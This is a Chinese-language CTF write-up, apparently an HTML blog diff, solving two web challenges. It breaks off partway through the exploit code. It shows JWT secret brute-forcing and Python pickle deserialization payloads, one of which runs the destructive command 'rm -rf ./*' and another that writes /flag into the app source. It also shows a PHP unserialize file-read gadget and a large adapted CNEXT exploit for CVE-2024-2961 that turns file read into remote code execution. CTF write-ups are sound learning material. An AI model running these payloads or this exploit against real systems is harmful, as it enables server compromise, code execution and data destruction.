+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204746082-101934285.png" alt="img" data-caption="img" loading="lazy"></p>
+<h2 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h2><p>扫了发现只有个login路由,交叉爆破一下用户名密码</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205437172-318927515.png" alt="img" data-caption="img" loading="lazy"></p>
+<p>爆出用户名密码是test&#x2F;123456返回给了个token,是jwt,存在密钥,爆破一下</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205437172-318927515.png" alt="img" data-caption="img" loading="lazy"></p>
+<p>得到key是a123456,然后jwt伪造</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205444958-1050385586.png" alt="img" data-caption="img" loading="lazy"></p>
+<p>更改jwt后点access后有一个弹窗，说ser有点好东西</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205502169-1811646368.png" alt="img" data-caption="img" loading="lazy"></p>
+<p>访问后能得到部分源码:</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205513354-1792537572.png" alt="img" data-caption="img" loading="lazy"></p>
+<p>分析源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hhhhackme</span>(<span class="params">pickled</span>):</span><br><span class="line">    data = base64.urlsafe_b64decode(pickled)</span><br><span class="line">    deserialized = pickle.loads(data)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>,<span class="number">204</span>;</span><br></pre></td></tr></table></figure>
+
+<p>发现能打python反序列化</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd=<span class="string">&#x27;&#x27;&#x27;import os;os.system(&#x27;ls&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>, (cmd,))</span><br><span class="line"></span><br><span class="line">malicious_data = pickle.dumps(A())</span><br><span class="line"></span><br><span class="line">encoded_malicious_data = base64.urlsafe_b64encode(malicious_data).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encoded malicious payload:&quot;</span>, encoded_malicious_data)</span><br></pre></td></tr></table></figure>
+
+<p>将上面结果发过去后并多次测试后发现无回显不出网</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205601347-1546485428.png" alt="img" data-caption="img" loading="lazy"></p>
+<p>因为无回显不出网，无法判断命令能否正常执行，所以尝试了一些破坏性的命令如<code>rm -rf ./*</code></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205613652-933257913.png" alt="img" data-caption="img" loading="lazy"></p>
+<p>判断出文件路径<code>/app/ser.py</code></p>
+<p>可以将命令结果直接写到这个文件并且读取了，因为写文件会影响ser.py文件的正常运行，所以在前面加#后面拼接命令，但是要注意的是输出的结果不要太多行，因为读取源码的时候发现会在每行后面加\n，输出多行的话只会在第一行前面加#，还是需要重启环境</p>
+<p>最后猜测flag位置在<code>/flag</code>，直接cat &#x2F;flag将结果输入到<code>ser.py</code>文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd=<span class="string">&#x27;&#x27;&#x27;import os;os.system(&#x27;echo &quot;#&quot;+&quot;`cat /flag`&quot; &gt;&gt; /app/ser.py&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>, (cmd,))</span><br><span class="line"></span><br><span class="line">malicious_data = pickle.dumps(A())</span><br><span class="line"></span><br><span class="line">encoded_malicious_data = base64.urlsafe_b64encode(malicious_data).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encoded malicious payload:&quot;</span>, encoded_malicious_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出：Encoded malicious payload: gASVWAAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw8aW1wb3J0IG9zO29zLnN5c3RlbSgnZWNobyAiIyIrImBjYXQgL2ZsYWdgIiA-PiAvYXBwL3Nlci5weScplIWUUpQu</span></span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205654359-4809249.png" alt="img" data-caption="img" loading="lazy"></p>
+<p>再次访问ser得到flag</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205703837-1572091863.png" alt="img" data-caption="img" loading="lazy"></p>
+<p>flag: 37ea8bacf16f4c1899ba23560c0b3ed1</p>
+<h2 id="fileread"><a href="#fileread" class="headerlink" title="fileread"></a>fileread</h2><p>题目给了源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class cls1&#123;</span><br><span class="line">    var $cls;</span><br><span class="line">    var $arr;</span><br><span class="line">    function show()&#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        foreach($this-&gt;arr as $k =&gt; $v)</span><br><span class="line">            echo $this-&gt;cls-&gt;$v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class cls2&#123;</span><br><span class="line">    var $filename = &#x27;hello.php&#x27;;</span><br><span class="line">    var $txt = &#x27;&#x27;;</span><br><span class="line">    function __get($key)&#123;</span><br><span class="line">           var_dump($key);</span><br><span class="line">        if($key == &#x27;fileput&#x27;)</span><br><span class="line">            return $this-&gt;fileput();</span><br><span class="line">        else</span><br><span class="line">            return &#x27;&lt;p&gt;&#x27;.htmlspecialchars($key).&#x27;&lt;/p&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    function fileput()&#123;</span><br><span class="line">        echo &#x27;Your file:&#x27;.file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!empty($_GET))&#123;</span><br><span class="line">    $cls = base64_decode($_GET[&#x27;ser&#x27;]);</span><br><span class="line">    $instance = unserialize($cls);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $a = new cls1();</span><br><span class="line">    $a-&gt;show();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>一个简单的反序列化,这样简单构造就能任意文件读取,但是读flag没有权限,后来看&#x2F;proc&#x2F;1&#x2F;cmdline可以发现有个&#x2F;tmp&#x2F;run.sh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a=new cls1();</span><br><span class="line">$a-&gt;cls=new cls2();</span><br><span class="line">$a-&gt;arr[]=&quot;fileput&quot;;</span><br><span class="line">$a-&gt;cls-&gt;filename=&quot;php://filter/read=convert.base64-encode/resource=/proc/1/cmdline&quot;;</span><br><span class="line">echo(serialize($a));</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/IB6e03GSTNsCq10J.png!thumbnail" alt="img" data-caption="img" loading="lazy"></p>
+<p>​	能够发现有个&#x2F;readflag,最后肯定是要执行&#x2F;readflag来获得flag,所以就是要任意文件读取转rce.md一开始试了filterchain写马,结果没成功,又是了php_filter_oracle攻击也没成功,不过这个可能是我打的有问题.</p>
+<p>最后尝试CVE-2024-2961,也是文件读取转RCE,但是得改脚本(这就是我为什么最后才试这个CVE的原因….真不想改啊)</p>
+<p>之前的比赛也有考这个CVE的题，例如:<a href="%5Bhttp://fffffilm.top/2024/09/15/BaseCTF-WEB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#Just-Readme%5D(http://fffffilm.top/2024/09/15/BaseCTF-WEB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#Just-Readme)">BaseCTF的Just Readme</a>和<a target="_blank" rel="noopener" href="http://fffffilm.top/2024/09/15/BaseCTF-WEB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#Just-Readme">春秋杯夏季赛wordpress</a></p>
+<p>主要借鉴了春秋杯夏季赛wordpress最后攻击的点改的脚本.</p>
+<p>最主要是改Remote这个类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Remote:</span><br><span class="line">    &quot;&quot;&quot;A helper class to send the payload and download files.</span><br><span class="line"></span><br><span class="line">    The logic of the exploit is always the same, but the exploit needs to know how to</span><br><span class="line">    download files (/proc/self/maps and libc) and how to send the payload.</span><br><span class="line"></span><br><span class="line">    The code here serves as an example that attacks a page that looks like:</span><br><span class="line"></span><br><span class="line">    ```php</span><br><span class="line">    &lt;?php</span><br><span class="line"></span><br><span class="line">    $data = file_get_contents($_POST[&#x27;file&#x27;]);</span><br><span class="line">    echo &quot;File contents: $data&quot;;</span><br></pre></td></tr></table></figure>
+
+<pre><code>Tweak it to fit your target, and start the exploit.
+&quot;&quot;&quot;
+
+def __init__(self, url: str) -&gt; None:
+    self.url = url
+    self.session = Session()
+def send(self, path: str) -&gt; Response:
+    &quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.
+    &quot;&quot;&quot;
+    p = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;
+    # 生成序列化字符串，并计算编码后的路径长度
+    a = len(p)
+    serialized_path = f&#39;O:4:&quot;cls1&quot;:2:&#123;&#123;s:3:"cls";O:4:"cls2":2:&#123;&#123;s:8:"filename";s:&#123;a&#125;:"&#123;p&#125;";s:3:"txt";s:0:"";&#125;&#125;s:3:&quot;arr&quot;;a:1:&#123;&#123;i:0;s:7:"fileput";&#125;&#125;&#125;&#125;;&#39;
+    # 对整个序列化后的字符串进行 base64 编码
+    encoded_serialized_path = base64.encode(serialized_path.encode(&#39;utf-8&#39;))
+
+    url =self.url
+    params=&#123;
+            &quot;ser&quot;:encoded_serialized_path
+    &#125;
+    print(params)
+    response = self.session.get(url, params=params)
+    print(response.text)
+    return response
+</code></pre>
+<h1 id="打印实际请求的-UR"><a href="#打印实际请求的-UR" class="headerlink" title="打印实际请求的 UR"></a>打印实际请求的 UR</h1><pre><code>   # return self.session.get(url, params=params)
+
+def download(self, path: str) -&gt; bytes:
+    &quot;&quot;&quot;Returns the contents of a remote file.
+    &quot;&quot;&quot;
+#     p = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;
+# # 生成序列化字符串，并计算编码后的路径长度
+#     a = len(p)
+#     serialized_path = f&#39;O:4:&quot;cls1&quot;:2:&#123;&#123;s:3:"cls";O:4:"cls2":2:&#123;&#123;s:8:"filename";s:&#123;a&#125;:"&#123;p&#125;";s:3:"txt";s:0:"";&#125;&#125;s:3:&quot;arr&quot;;a:1:&#123;&#123;i:0;s:7:"fileput";&#125;&#125;&#125;&#125;;&#39;
+# # 对整个序列化后的字符串进行 base64 编码
+#     encoded_serialized_path = base64.encode(serialized_path.encode(&#39;utf-8&#39;))
+#     print(encoded_serialized_path)
+# 发送请求，获取响应
+    response = self.send(path)
+    print(response)
+    #path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;
+    #response = self.send(path)
+    data = re.search(r&#39;Your file:(.*)&#39;, response.text, flags=re.S).group(1)
+    #data=response.text
+    return base64.decode(data)
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这里传递payload，于是在序列化字符串`filename`部分改成`s:&#123;a&#125;:&quot;&#123;p&#125;&quot;`，`&#123;a&#125;`是payload的长度，`&#123;p&#125;`是原payload</span><br><span class="line"></span><br><span class="line">之后再用base64加密,并将原来的post传参改成get传参即可</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">response = self.session.get(url, params=params)</span><br></pre></td></tr></table></figure>
+
+<p>然后就是另一个卡我半天的点</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = re.search(<span class="string">r&#x27;Your file:(.*)&#x27;</span>, response.text, flags=re.S).group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>匹配语句这部分，要匹配的是响应的内容<code>file:</code>之后的部分</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205236168-702125291.png" alt="img" data-caption="img" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205241457-510358314.png" alt="img" data-caption="img" loading="lazy"></p>
+<p>​	这部分是库库卡我啊,卡我快一个小时,之后是在能验证漏洞存在,但是执行exp的问题</p>
+<p>​	后来找到是因为我原本是在def download这个函数里写的传payload,最后执行exp的时候send函数里没写报的错,把这个一改就直接打通了最终脚本:</p>
+<p>最终exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">#</span><br><span class="line"># CNEXT: PHP file-read to RCE</span><br><span class="line"># Date: 2024-05-27</span><br><span class="line"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span><br><span class="line">#</span><br><span class="line"># TODO Parse LIBC to know if patched</span><br><span class="line">#</span><br><span class="line"># INFORMATIONS</span><br><span class="line">#</span><br><span class="line"># To use, implement the Remote class, which tells the exploit how to send the payload.</span><br><span class="line">#</span><br><span class="line"># REQUIREMENTS</span><br><span class="line">#</span><br><span class="line"># Requires ten: https://github.com/cfreal/ten</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">from __future__ import annotations</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">import zlib</span><br><span class="line">from dataclasses import dataclass</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from requests.exceptions import ChunkedEncodingError, ConnectionError</span><br><span class="line">from ten import *</span><br><span class="line"></span><br><span class="line">HEAP_SIZE = 2 * 1024 * 1024</span><br><span class="line">BUG = &quot;劄&quot;.encode(&quot;utf-8&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Remote:</span><br><span class="line">    &quot;&quot;&quot;A helper class to send the payload and download files.</span><br><span class="line"></span><br><span class="line">    The logic of the exploit is always the same, but the exploit needs to know how to</span><br><span class="line">    download files (/proc/self/maps and libc) and how to send the payload.</span><br><span class="line"></span><br><span class="line">    The code here serves as an example that attacks a page that looks like:</span><br><span class="line"></span><br><span class="line">    ```php</span><br><span class="line">    &lt;?php</span><br><span class="line"></span><br><span class="line">    $data = file_get_contents($_POST[&#x27;file&#x27;]);</span><br><span class="line">    echo &quot;File contents: $data&quot;;</span><br></pre></td></tr></table></figure>
+
+<pre><code>Tweak it to fit your target, and start the exploit.
+&quot;&quot;&quot;
+
+def __init__(self, url: str) -&gt; None:
+    self.url = url
+    self.session = Session()
+def send(self, path: str) -&gt; Response:
+    &quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.
+    &quot;&quot;&quot;
+    p = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;
+    # 生成序列化字符串，并计算编码后的路径长度
+    a = len(p)
+    serialized_path = f&#39;O:4:&quot;cls1&quot;:2:&#123;&#123;s:3:"cls";O:4:"cls2":2:&#123;&#123;s:8:"filename";s:&#123;a&#125;:"&#123;p&#125;";s:3:"txt";s:0:"";&#125;&#125;s:3:&quot;arr&quot;;a:1:&#123;&#123;i:0;s:7:"fileput";&#125;&#125;&#125;&#125;;&#39;
+    # 对整个序列化后的字符串进行 base64 编码
+    encoded_serialized_path = base64.encode(serialized_path.encode(&#39;utf-8&#39;))
+
+    url =self.url
+    params=&#123;
+            &quot;ser&quot;:encoded_serialized_path
+    &#125;
+    print(params)
+    response = self.session.get(url, params=params)
+    print(response.text)
+    return response
+</code></pre>
+<h1 id="打印实际请求的-UR-1"><a href="#打印实际请求的-UR-1" class="headerlink" title="打印实际请求的 UR"></a>打印实际请求的 UR</h1><pre><code>   # return self.session.get(url, params=params)
+
+def download(self, path: str) -&gt; bytes:
+    &quot;&quot;&quot;Returns the contents of a remote file.
+    &quot;&quot;&quot;
+#     p = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;
+# # 生成序列化字符串，并计算编码后的路径长度
+#     a = len(p)
+#     serialized_path = f&#39;O:4:&quot;cls1&quot;:2:&#123;&#123;s:3:"cls";O:4:"cls2":2:&#123;&#123;s:8:"filename";s:&#123;a&#125;:"&#123;p&#125;";s:3:"txt";s:0:"";&#125;&#125;s:3:&quot;arr&quot;;a:1:&#123;&#123;i:0;s:7:"fileput";&#125;&#125;&#125;&#125;;&#39;
+# # 对整个序列化后的字符串进行 base64 编码
+#     encoded_serialized_path = base64.encode(serialized_path.encode(&#39;utf-8&#39;))
+#     print(encoded_serialized_path)
+# 发送请求，获取响应
+    response = self.send(path)
+    print(response)
+    #path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;
+    #response = self.send(path)
+    data = re.search(r&#39;Your file:(.*)&#39;, response.text, flags=re.S).group(1)
+    #data=response.text
+    return base64.decode(data)
+</code></pre>
+<p>@entry<br>@arg(“url”, “Target URL”)<br>@arg(“command”, “Command to run on the system; limited to 0x140 bytes”)<br>@arg(“sleep_time”, “Time to sleep to assert that the exploit worked. By default, 1.”)<br>@arg(“heap”, “Address of the main zend_mm_heap structure.”)<br>@arg(<br>    “pad”,<br>    “Number of 0x100 chunks to pad with. If the website makes a lot of heap “<br>    “operations with this size, increase this. Defaults to 20.”,<br>)<br>@dataclass<br>class Exploit:<br>    “””CNEXT exploit: RCE using a file read primitive in PHP.”””</p>
+<pre><code>url: str
+command: str
+sleep: int = 1
+heap: str = None
+pad: int = 20
+
+def __post_init__(self):
+    self.remote = Remote(self.url)
+    self.log = logger(&quot;EXPLOIT&quot;)
+    self.info = &#123;&#125;
+    self.heap = self.heap and int(self.heap, 16)
+
+def check_vulnerable(self) -&gt; None:
+    &quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various
+    wrappers and filters that the exploit needs.
+    &quot;&quot;&quot;
+
+    def safe_download(path: str) -&gt; bytes:
+        try:
+            rep=self.remote.download(path)
+            return rep
+        except ConnectionError:
+            failure(&quot;Target not [b]reachable[/] ?&quot;)
+
+    def check_token(text: str, path: str) -&gt; bool:
+        result = safe_download(path)
+        return text.encode() == result
+
+    text = tf.random.string(50).encode()
+    base64 = b64(text, misalign=True).decode()
+    path = f&quot;data:text/plain;base64,&#123;base64&#125;&quot;
+
+    result = safe_download(path)
+    #print(base64.encode(result))
+    if text not in result:
+        msg_failure(&quot;Remote.download did not return the test string&quot;)
+        print(&quot;--------------------&quot;)
+        print(f&quot;Expected test string: &#123;text&#125;&quot;)
+        print(f&quot;Got: &#123;result&#125;&quot;)
+        print(&quot;--------------------&quot;)
+        failure(&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;)
+
+    msg_info(&quot;The [i]data://[/] wrapper works&quot;)
+
+    text = tf.random.string(50)
+    base64 = b64(text.encode(), misalign=True).decode()
+    path = f&quot;php://filter//resource=data:text/plain;base64,&#123;base64&#125;&quot;
+    if not check_token(text, path):
+        failure(&quot;The [i]php://filter/[/] wrapper does not work&quot;)
+
+    msg_info(&quot;The [i]php://filter/[/] wrapper works&quot;)
+
+    text = tf.random.string(50)
+    base64 = b64(compress(text.encode()), misalign=True).decode()
+    path = f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,&#123;base64&#125;&quot;
+
+    if not check_token(text, path):
+        failure(&quot;The [i]zlib[/] extension is not enabled&quot;)
+
+    msg_info(&quot;The [i]zlib[/] extension is enabled&quot;)
+
+    msg_success(&quot;Exploit preconditions are satisfied&quot;)
+
+def get_file(self, path: str) -&gt; bytes:
+    with msg_status(f&quot;Downloading [i]&#123;path&#125;[/]...&quot;):
+        return self.remote.download(path)
+
+def get_regions(self) -&gt; list[Region]:
+    &quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;
+    maps = self.get_file(&quot;/proc/self/maps&quot;)
+    maps = maps.decode()
+    PATTERN = re.compile(
+        r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot; r&quot;.*&quot; r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot; r&quot;(.*)&quot;
+    )
+    regions = []
+    for region in table.split(maps, strip=True):
+        if match := PATTERN.match(region):
+            start = int(match.group(1), 16)
+            stop = int(match.group(2), 16)
+            permissions = match.group(3)
+            path = match.group(4)
+            if &quot;/&quot; in path or &quot;[&quot; in path:
+                path = path.rsplit(&quot; &quot;, 1)[-1]
+            else:
+                path = &quot;&quot;
+            current = Region(start, stop, permissions, path)
+            regions.append(current)
+        else:
+            print(maps)
+            failure(&quot;Unable to parse memory mappings&quot;)
+
+    self.log.info(f&quot;Got &#123;len(regions)&#125; memory regions&quot;)
+
+    return regions
+
+def get_symbols_and_addresses(self) -&gt; None:
+    &quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;
+    regions = self.get_regions()
+
+    LIBC_FILE = &quot;/dev/shm/cnext-libc&quot;
+
+    # PHP&#39;s heap
+
+    self.info[&quot;heap&quot;] = self.heap or self.find_main_heap(regions)
+
+    # Libc
+
+    libc = self._get_region(regions, &quot;libc-&quot;, &quot;libc.so&quot;)
+
+    self.download_file(libc.path, LIBC_FILE)
+
+    self.info[&quot;libc&quot;] = ELF(LIBC_FILE, checksec=False)
+    self.info[&quot;libc&quot;].address = libc.start
+
+def _get_region(self, regions: list[Region], *names: str) -&gt; Region:
+    &quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;
+    for region in regions:
+        if any(name in region.path for name in names):
+            break
+    else:
+        failure(&quot;Unable to locate region&quot;)
+
+    return region
+
+def download_file(self, remote_path: str, local_path: str) -&gt; None:
+    &quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;
+    data = self.get_file(remote_path)
+    Path(local_path).write(data)
+
+def find_main_heap(self, regions: list[Region]) -&gt; Region:
+    # Any anonymous RW region with a size superior to the base heap size is a
+    # candidate. The heap is at the bottom of the region.
+    heaps = [
+        region.stop - HEAP_SIZE + 0x40
+        for region in reversed(regions)
+        if region.permissions == &quot;rw-p&quot;
+        and region.size &gt;= HEAP_SIZE
+        and region.stop &amp; (HEAP_SIZE - 1) == 0
+        and region.path == &quot;&quot;
+    ]
+
+    if not heaps:
+        failure(&quot;Unable to find PHP&#39;s main heap in memory&quot;)
+
+    first = heaps[0]
+
+    if len(heaps) &gt; 1:
+        heaps = &quot;, &quot;.join(map(hex, heaps))
+        msg_info(f&quot;Potential heaps: [i]&#123;heaps&#125;[/] (using first)&quot;)
+    else:
+        msg_info(f&quot;Using [i]&#123;hex(first)&#125;[/] as heap&quot;)
+
+    return first
+
+def run(self) -&gt; None:
+    self.check_vulnerable()
+    self.get_symbols_and_addresses()
+    self.exploit()
+
+def build_exploit_path(self) -&gt; str:
+
+    LIBC = self.info[&quot;libc&quot;]
+    ADDR_EMALLOC = LIBC.symbols[&quot;__libc_malloc&quot;]
+    ADDR_EFREE = LIBC.symbols[&quot;__libc_system&quot;]
+    ADDR_EREALLOC = LIBC.symbols[&quot;__libc_realloc&quot;]
+
+    ADDR_HEAP = self.info[&quot;heap&quot;]
+    ADDR_FREE_SLOT = ADDR_HEAP + 0x20
+    ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168
+
+    ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10
+
+    CS = 0x100
+
+    # Pad needs to stay at size 0x100 at every step
+    pad_size = CS - 0x18
+    pad = b&quot;\x00&quot; * pad_size
+    pad = chunked_chunk(pad, len(pad) + 6)
+    pad = chunked_chunk(pad, len(pad) + 6)
+    pad = chunked_chunk(pad, len(pad) + 6)
+    pad = compressed_bucket(pad)
+
+    step1_size = 1
+    step1 = b&quot;\x00&quot; * step1_size
+    step1 = chunked_chunk(step1)
+    step1 = chunked_chunk(step1)
+    step1 = chunked_chunk(step1, CS)
+    step1 = compressed_bucket(step1)
+
+    # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
+    # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;
+
+    step2_size = 0x48
+    step2 = b&quot;\x00&quot; * (step2_size + 8)
+    step2 = chunked_chunk(step2, CS)
+    step2 = chunked_chunk(step2)
+    step2 = compressed_bucket(step2)
+
+    step2_write_ptr = b&quot;0\n&quot;.ljust(step2_size, b&quot;\x00&quot;) + p64(ADDR_FAKE_BIN)
+    step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
+    step2_write_ptr = chunked_chunk(step2_write_ptr)
+    step2_write_ptr = compressed_bucket(step2_write_ptr)
+
+    step3_size = CS
+
+    step3 = b&quot;\x00&quot; * step3_size
+    assert len(step3) == CS
+    step3 = chunked_chunk(step3)
+    step3 = chunked_chunk(step3)
+    step3 = chunked_chunk(step3)
+    step3 = compressed_bucket(step3)
+
+    step3_overflow = b&quot;\x00&quot; * (step3_size - len(BUG)) + BUG
+    assert len(step3_overflow) == CS
